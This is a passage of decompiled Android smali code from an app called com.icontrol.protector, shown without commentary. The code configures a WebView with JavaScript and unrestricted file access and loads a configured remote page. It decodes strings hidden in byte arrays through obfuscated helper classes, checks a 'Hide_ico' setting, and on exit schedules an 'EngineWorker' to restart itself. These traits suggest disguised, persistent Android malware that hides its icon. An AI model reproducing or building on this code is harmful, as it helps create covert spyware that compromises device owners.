    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setLoadsImagesAutomatically(Z)V

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1, v5}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V

    const/4 v1, 0x0

    :try_start_2
    sget-object v7, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v7, v6, v1}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V

    sget-object v6, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v6}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    sget-object v7, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;

    invoke-virtual {v6, v7}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V

    sget-object v6, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v6}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v6

    sget-object v7, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;

    invoke-virtual {v6, v7}, Landroid/webkit/WebSettings;->setRenderPriority(Landroid/webkit/WebSettings$RenderPriority;)V

    sget-object v6, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v6, v3}, Landroid/webkit/WebView;->setBackgroundColor(I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    sget-object v3, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v3}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    invoke-virtual {v3, v5}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/tq;->c()Lntidisestablish/neumonoul/floccinaucinih/tq;

    move-result-object v3

    sget-object v6, Lcom/icontrol/protector/My_Configs;->HOME_NAME:Ljava/lang/String;

    invoke-virtual {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/tq;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lcom/icontrol/protector/ActivMain;->e:Ljava/lang/String;

    sget-object v3, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    new-instance v6, Lcom/icontrol/protector/ActivMain$c;

    invoke-direct {v6, p0}, Lcom/icontrol/protector/ActivMain$c;-><init>(Lcom/icontrol/protector/ActivMain;)V

    invoke-virtual {v3, v6}, Landroid/webkit/WebView;->setDownloadListener(Landroid/webkit/DownloadListener;)V

    sget-object v3, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    new-instance v6, Lcom/icontrol/protector/ActivMain$e;

    invoke-direct {v6, p0}, Lcom/icontrol/protector/ActivMain$e;-><init>(Lcom/icontrol/protector/ActivMain;)V

    invoke-virtual {v3, v6}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    sget-object v3, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    new-instance v6, Lcom/icontrol/protector/ActivMain$f;

    invoke-direct {v6, p0, v1}, Lcom/icontrol/protector/ActivMain$f;-><init>(Lcom/icontrol/protector/ActivMain;Lcom/icontrol/protector/ActivMain$a;)V

    invoke-virtual {v3, v6}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1}, Landroid/webkit/WebSettings;->getUserAgentString()Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v3}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    invoke-virtual {v3, v1}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {p0, v1}, Lcom/icontrol/protector/ActivMain;->l(Landroid/content/Context;)V

    sget-object v3, Lcom/icontrol/protector/My_Configs;->Hide_ico:Ljava/lang/String;

    new-array v2, v2, [B

    const/16 v6, -0x77

    aput-byte v6, v2, v5

    new-array v5, v0, [B

    fill-array-data v5, :array_18

    invoke-static {v2, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_e

    new-array v2, v0, [B

    fill-array-data v2, :array_19

    new-array v3, v0, [B

    fill-array-data v3, :array_1a

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v1, v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_e

    invoke-virtual {p0}, Lcom/icontrol/protector/ActivMain;->finish()V

    goto/16 :goto_6

    :cond_e
    iget-object v1, p0, Lcom/icontrol/protector/ActivMain;->e:Ljava/lang/String;

    const/4 v2, 0x7

    new-array v3, v2, [B

    fill-array-data v3, :array_1b

    new-array v5, v0, [B

    fill-array-data v5, :array_1c

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_f

    iget-object v1, p0, Lcom/icontrol/protector/ActivMain;->e:Ljava/lang/String;

    new-array v3, v0, [B

    fill-array-data v3, :array_1d

    new-array v5, v0, [B

    fill-array-data v5, :array_1e

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_f

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    new-array v2, v2, [B

    fill-array-data v2, :array_1f

    new-array v3, v0, [B

    fill-array-data v3, :array_20

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/icontrol/protector/ActivMain;->e:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/icontrol/protector/ActivMain;->e:Ljava/lang/String;

    :cond_f
    sget-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    iget-object v2, p0, Lcom/icontrol/protector/ActivMain;->e:Ljava/lang/String;

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    iget-boolean p1, p1, Lntidisestablish/neumonoul/floccinaucinih/y9;->f:Z

    if-eqz p1, :cond_11

    const/16 p1, 0xc

    new-array p1, p1, [B

    fill-array-data p1, :array_21

    new-array v0, v0, [B

    fill-array-data v0, :array_22

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/net/ConnectivityManager;

    invoke-virtual {p1}, Landroid/net/ConnectivityManager;->isActiveNetworkMetered()Z

    move-result v0

    if-eqz v0, :cond_11

    invoke-virtual {p1}, Landroid/net/ConnectivityManager;->getRestrictBackgroundStatus()I

    move-result p1

    if-eq p1, v4, :cond_10

    goto :goto_6

    :cond_10
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lcom/icontrol/protector/RequestDataUsage;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v0, 0x10000000

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_11
    :goto_6
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-static {p1}, Lntidisestablish/neumonoul/floccinaucinih/hm;->a(Landroid/content/Context;)V

    :goto_7
    return-void

    :array_0
    .array-data 1
        0x51t
        0x16t
        -0x2bt
        0x10t
    .end array-data

    :array_1
    .array-data 1
        0x6t
        0x65t
        -0x4at
        0x62t
        -0x54t
        -0x70t
        0x7t
        -0x7at
    .end array-data

    :array_2
    .array-data 1
        0x32t
        -0x48t
        -0x4t
        0x23t
    .end array-data

    :array_3
    .array-data 1
        0x7at
        -0x35t
        -0x61t
        0x51t
        0x1t
        0x7ct
        0x7ct
        0x2at
    .end array-data

    :array_4
    .array-data 1
        -0x77t
        0x4ct
        0x41t
        -0x24t
        0x53t
        0x55t
        -0x63t
        0x57t
    .end array-data

    :array_5
    .array-data 1
        -0x3at
        -0x34t
    .end array-data

    nop

    :array_6
    .array-data 1
        -0x44t
        -0x5ct
        -0x3bt
        0x1at
        0x3t
        0x79t
        -0x7bt
        0x41t
    .end array-data

    :array_7
    .array-data 1
        -0x76t
        0x3et
    .end array-data

    nop

    :array_8
    .array-data 1
        -0x2t
        0x4ct
        0x27t
        -0x64t
        0x13t
        -0x3bt
        0x45t
        0xft
    .end array-data

    :array_9
    .array-data 1
        -0x3ft
        -0x51t
    .end array-data

    nop

    :array_a
    .array-data 1
        -0x5ct
        -0x3ft
        -0x4dt
        0x63t
        0x78t
        0x1t
        0x8t
        -0x34t
    .end array-data

    :array_b
    .array-data 1
        0x3dt
        -0x22t
    .end array-data

    nop

    :array_c
    .array-data 1
        0x5ct
        -0x54t
        -0x3ct
        0x3ct
        -0x1et
        -0x10t
        0xet
        0x60t
    .end array-data

    :array_d
    .array-data 1
        -0x39t
        0x6t
        0x6et
        -0x2at
        -0x21t
        -0xat
        -0x2dt
        0x40t
        -0x39t
        0xct
        0x3at
        -0x61t
        -0x2et
        -0x13t
        -0x28t
        0x5ct
        -0x34t
        0xat
        0x3at
        -0x2at
        -0x22t
        -0x14t
        -0x6at
        0x56t
        -0x34t
        0x1dt
        0x2bt
        -0x24t
        -0x3bt
        -0x19t
        -0x2et
        0x1ct
        -0x5dt
        0x63t
        0x6et
        -0x31t
        -0x23t
        -0x19t
        -0x29t
        0x41t
        -0x34t
        0x49t
        0x2dt
        -0x30t
        -0x21t
        -0x14t
        -0x2dt
        0x51t
        -0x23t
        0x49t
        0x3at
        -0x30t
        -0x6ft
        -0x15t
        -0x28t
        0x46t
        -0x34t
        0x1bt
        0x20t
        -0x26t
        -0x3bt
        -0x5et
        -0x29t
        0x5ct
        -0x33t
        0x49t
        0x3at
        -0x33t
        -0x38t
        -0x5et
        -0x29t
        0x55t
        -0x38t
        0x0t
        0x20t
    .end array-data

    :array_e
    .array-data 1
        -0x57t
        0x69t
        0x4et
        -0x41t
        -0x4ft
        -0x7et
        -0x4at
        0x32t
    .end array-data

    :array_f
    .array-data 1
        0x5at
        -0x78t
        0x5at
        0x15t
        -0x2ct
        0x39t
        -0xdt
        -0x5bt
        0x13t
        -0x7ct
        0x4ft
        -0x4ct
        0x39t
        0x3bt
        -0x9t
        -0x41t
        0x47t
        0x22t
        -0x61t
        0x3t
        0x62t
        -0x1at
        -0x4at
        -0x50t
        0x5ft
        -0x7ft
        -0x16t
        -0x3ft
        -0x36t
        0x36t
        -0x8t
        -0x44t
        0x52t
        -0x7et
        -0x16t
        -0x3ft
        -0x78t
        0x5dt
        -0x64t
        -0xft
        0x5ft
        0x25t
        -0x6et
        0x4t
        -0x40t
        0x32t
        -0x8t
        -0xft
        0x5at
        -0x78t
        0x5at
        0x15t
        -0x2ct
        0x39t
        -0xdt
        -0x5bt
        0x56t
        -0x3at
        0x4ct
        0x11t
        0x62t
        -0x38t
        -0x6t
        -0x50t
        0x5dt
        0x22t
        -0x61t
        0x1et
        -0x7at
        0x21t
        -0xdt
        -0xft
        0x47t
        -0x7dt
        0x45t
        0x2t
        -0x39t
        0x25t
        -0x4at
        -0x4bt
        0x56t
        -0x78t
        0x4bt
        0x9t
        -0x31t
        0x39t
    .end array-data

    nop

    :array_10
    .array-data 1
        0x33t
        -0x1at
        0x2et
        0x70t
        -0x5at
        0x57t
        -0x6at
        -0x2ft
    .end array-data

    :array_11
    .array-data 1
        -0x79t
        -0x70t
        -0x1at
        -0x20t
        0x75t
        -0x25t
        -0x20t
        -0x4dt
        -0x16t
        -0x17t
        -0x3ct
        -0x4at
        -0xat
        0x12t
        0x68t
        0x72t
        0x4t
        0x7et
        0x22t
        0x63t
        -0x5et
        0x7bt
        -0x12t
        -0x47t
        -0x1t
        -0x16t
        -0x3et
        -0x5dt
        0x35t
        -0x25t
        -0x7ct
        0xct
        0x6bt
        0x2ct
        -0x5ct
        -0x57t
        0x61t
        -0x4dt
        -0x47t
        -0x68t
        -0x79t
        -0x7et
        -0x17t
        -0x1dt
        0x5et
        -0x15t
        0x26t
        0x4ft
        0xft
        0x78t
        0x29t
        0x74t
        -0x48t
        0x3et
        0x72t
        0x26t
        -0x7ct
        -0x4bt
        -0x6t
        -0x11t
        0x51t
        -0x2at
        -0x12t
        -0x57t
        -0xct
    .end array-data

    nop

    :array_12
    .array-data 1
        0x61t
        0xct
        0x4ct
        0x6t
        -0x2at
        0x5bt
        0x6t
        0x6t
    .end array-data

    :array_13
    .array-data 1
        0x71t
        0x50t
        -0x80t
        -0x68t
        -0x42t
        0x21t
        -0x5at
        -0x3at
        0x2t
        0xdt
        -0x24t
        0x3dt
        0x46t
        0x5ft
        -0xbt
        -0x66t
        0x71t
        0x57t
        -0x7ft
        -0x57t
        0x47t
        0x79t
        0xct
        -0x3at
        0x11t
        0xdt
        -0x21t
        0x3dt
        0x46t
        0x5ft
        -0xct
        -0x4ct
        0x70t
        0x61t
        -0x7ft
        -0x46t
        0x47t
        0x7ct
        0xct
        -0x3at
        0x0t
        0xct
        -0x2t
        -0x3ct
        0x1at
        0x20t
        -0x77t
        -0x39t
        0x2et
        0xct
        -0xdt
        -0x3bt
        0x2ft
        0x21t
        -0x56t
        -0x3at
        0x2t
        -0xct
        0x77t
        0x17t
        -0x6ct
        -0x28t
        -0xct
        -0x47t
        0x71t
        0x50t
        -0x7ft
        -0x54t
        0x46t
        0x54t
        -0xct
        -0x47t
        0x70t
        0x75t
        0x79t
        -0x3bt
        0x39t
        0x21t
        -0x58t
        -0x3at
        0xft
        0xct
        -0xdt
        -0x3bt
        0x2bt
        0x20t
        -0x75t
        -0x39t
        0x2ct
        -0xct
        -0x7ft
        -0x4bt
        0x46t
        0x5ft
        -0xbt
        -0x66t
        0x70t
        0x71t
        -0x80t
        -0x65t
        0x46t
        0x52t
        -0xct
        -0x51t
        0x71t
        0x52t
        -0x7ft
        -0x49t
        -0x42t
        0x21t
        -0x5ct
        -0x3at
        0xft
        0xdt
        -0x23t
        -0x3ct
        0x1bt
        0x20t
        -0x7ft
        -0x3at
        0xft
        0xdt
        -0x2ft
        -0x3ct
        0x1at
        0x20t
        -0x7bt
        0x3et
        0x71t
        0x51t
        -0x7ft
        -0x54t
        0x46t
        0x51t
        0xct
        -0x3at
        0xbt
        0xct
        -0x9t
        -0x3bt
        0x2ft
        0x21t
        -0x5bt
    .end array-data

    :array_14
    .array-data 1
        -0x58t
        -0x2ct
        0x59t
        0x1dt
        -0x62t
        -0x8t
        0x2ct
        0x1et
    .end array-data

    :array_15
    .array-data 1
        -0x56t
        0x6ct
        0x5ft
        -0x1at
        0x12t
        -0x7ft
        0x57t
        0x1et
        -0x76t
        0x66t
        0xbt
        -0x51t
        0x1ft
        -0x66t
        0x5ct
        0x2t
        -0x7ft
        0x60t
        0xbt
        -0x1at
        0x13t
        -0x65t
        0x12t
        0x8t
        -0x7ft
        0x77t
        0x1at
        -0x14t
        0x8t
        -0x70t
        0x56t
        0x42t
        -0x12t
        0x9t
        0x5ft
        -0x1t
        0x10t
        -0x70t
        0x53t
        0x1ft
        -0x7ft
        0x23t
        0x1ct
        -0x20t
        0x12t
        -0x65t
        0x57t
        0xft
        -0x70t
        0x23t
        0xbt
        -0x20t
        0x5ct
        -0x64t
        0x5ct
        0x18t
        -0x7ft
        0x71t
        0x11t
        -0x16t
        0x8t
        -0x2bt
        0x53t
        0x2t
        -0x80t
        0x23t
        0xbt
        -0x3t
        0x5t
        -0x2bt
        0x53t
        0xbt
        -0x7bt
        0x6at
        0x11t
    .end array-data

    :array_16
    .array-data 1
        -0x1ct
        0x3t
        0x7ft
        -0x71t
        0x7ct
        -0xbt
        0x32t
        0x6ct
    .end array-data

    :array_17
    .array-data 1
        -0x6t
        -0x74t
        0x72t
        -0x4et
        0x40t
        -0x60t
        0x9t
        0x38t
    .end array-data

    :array_18
    .array-data 1
        -0x48t
        -0x6et
        0x33t
        0x33t
        0x3ct
        0x7dt
        -0x2et
        -0x2ct
    .end array-data

    :array_19
    .array-data 1
        0x3bt
        0x58t
        0x5dt
        0x6ft
        -0x15t
        0x16t
        -0x19t
        0x5at
    .end array-data

    :array_1a
    .array-data 1
        0x48t
        0x3dt
        0x29t
        0x1at
        -0x65t
        0x49t
        -0x78t
        0x31t
    .end array-data

    :array_1b
    .array-data 1
        -0x57t
        -0x77t
        0xct
        -0x1bt
        0x1t
        0x55t
        -0x67t
    .end array-data

    :array_1c
    .array-data 1
        -0x3ft
        -0x3t
        0x78t
        -0x6bt
        0x3bt
        0x7at
        -0x4at
        0x1bt
    .end array-data

    :array_1d
    .array-data 1
        0x41t
        -0x4t
        0xdt
        0x11t
        -0x34t
        0x46t
        -0x2bt
        0x48t
    .end array-data

    :array_1e
    .array-data 1
        0x29t
        -0x78t
        0x79t
        0x61t
        -0x41t
        0x7ct
        -0x6t
        0x67t
    .end array-data

    :array_1f
    .array-data 1
        0x6at
        -0x2t
        0x31t
        0x1dt
        -0xct
        0x1t
        -0x7bt
    .end array-data

    :array_20
    .array-data 1
        0x2t
        -0x76t
        0x45t
        0x6dt
        -0x32t
        0x2et
        -0x56t
        0x2at
    .end array-data

    :array_21
    .array-data 1
        -0x4et
        0x30t
        0x43t
        -0x58t
        -0x4t
        -0x1bt
        0x37t
        -0x55t
        -0x59t
        0x36t
        0x59t
        -0x41t
    .end array-data

    :array_22
    .array-data 1
        -0x2ft
        0x5ft
        0x2dt
        -0x3at
        -0x67t
        -0x7at
        0x43t
        -0x3et
    .end array-data
.end method

.method protected onDestroy()V
    .locals 5

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/icontrol/protector/ActivMain;->l(Landroid/content/Context;)V

    const/4 v1, 0x0

    sput-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3a98

    add-long/2addr v1, v3

    const-class v3, Lcom/icontrol/protector/EngineWorker;

    invoke-static {v0, v3, v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/y1;->b(Landroid/content/Context;Ljava/lang/Class;J)V

    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 0

    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    return-void
.end method

.method protected onRestoreInstanceState(Landroid/os/Bundle;)V
    .locals 1

    invoke-super {p0, p1}, Landroid/app/Activity;->onRestoreInstanceState(Landroid/os/Bundle;)V

    sget-object v0, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->restoreState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    :cond_0
    return-void
.end method

.method protected onSaveInstanceState(Landroid/os/Bundle;)V
    .locals 1

    invoke-super {p0, p1}, Landroid/app/Activity;->onSaveInstanceState(Landroid/os/Bundle;)V

    sget-object v0, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->saveState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    :cond_0
    return-void
.end method
